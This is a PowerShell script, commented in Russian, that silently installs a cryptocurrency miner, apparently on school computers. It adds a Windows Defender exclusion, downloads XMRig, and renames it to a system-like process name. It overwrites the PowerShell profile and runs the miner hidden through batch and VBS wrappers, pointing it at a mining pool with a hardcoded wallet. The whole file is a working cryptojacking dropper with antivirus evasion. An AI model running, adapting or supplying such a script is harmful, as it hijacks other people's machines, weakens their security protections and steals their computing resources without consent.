$path = "C:\ProgramData\SystemLib"
$url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$wallet = "Ltc1ql404nad6rja6paas9h7dnd2uwmkju3re3s4tuf"
$procName = "WinDirectX"

# 1. ПОПЫТКА ДОБАВИТЬ ИСКЛЮЧЕНИЕ (Самый критичный момент)
Write-Host "--- Этап 1: Настройка защиты ---" -ForegroundColor Cyan
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force }
try {
    Add-MpPreference -ExclusionPath $path -ErrorAction Stop
    Write-Host "[OK] Папка добавлена в исключения." -ForegroundColor Green
} catch {
    Write-Host "[!] Не удалось добавить исключение (нужны права админа)." -ForegroundColor Yellow
}

# 2. ЗАГРУЗКА
Write-Host "--- Этап 2: Загрузка файлов ---" -ForegroundColor Cyan
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile "$path\data.zip" -ErrorAction Stop
    Write-Host "[OK] Файл скачан." -ForegroundColor Green
} catch {
    Write-Host "[ОШИБКА] Не удалось скачать файл. Проверь интернет." -ForegroundColor Red
}

# 3. РАСПАКОВКА И ПЕРЕИМЕНОВАНИЕ
Write-Host "--- Этап 3: Распаковка ---" -ForegroundColor Cyan
try {
    Expand-Archive -Path "$path\data.zip" -DestinationPath $path -Force
    if (Test-Path "$path\xmrig.exe") {
        Move-Item "$path\xmrig.exe" "$path\$procName.exe" -Force
        Write-Host "[OK] Программа готова." -ForegroundColor Green
    }
    Remove-Item "$path\data.zip" -Force
} catch {
    Write-Host "[ОШИБКА] Ошибка при распаковке. Возможно, антивирус удалил файл." -ForegroundColor Red
}

# 4. СОЗДАНИЕ КОМАНДЫ ПРОВЕРКИ (Улучшенные логи)
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force }
$CheckFunc = @"
function check {
    Write-Host "--- ОТЧЕТ СИСТЕМЫ ---" -ForegroundColor Cyan
    `$p = "$path"
    `$f = "$path\$procName.exe"
    
    if (Test-Path `$p) { Write-Host "[+] Папка существует" -ForegroundColor Green } else { Write-Host "[-] Папки НЕТ" -ForegroundColor Red }
    if (Test-Path `$f) { Write-Host "[+] Файл на месте" -ForegroundColor Green } else { Write-Host "[-] Файла НЕТ (удален антивирусом)" -ForegroundColor Red }
    
    `$proc = Get-Process $procName -ErrorAction SilentlyContinue
    if (`$proc) {
        Write-Host "[+] ПРОЦЕСС ЗАПУЩЕН (ID: `$(`$proc.Id))" -ForegroundColor Green
    } else {
        Write-Host "[-] ПРОЦЕСС НЕ РАБОТАЕТ" -ForegroundColor Red
    }
}
"@
$CheckFunc | Out-File -FilePath $ProfilePath -Force

# 5. ЗАПУСК
$cmd = "@echo off`n$path\$procName.exe -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --cpu-max-threads-hint 50 --priority 1"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

Start-Process -FilePath "$path\win_start.vbs"
Write-Host "`nУстановка завершена. Перезапустите PowerShell и введите 'check'" -ForegroundColor Magenta
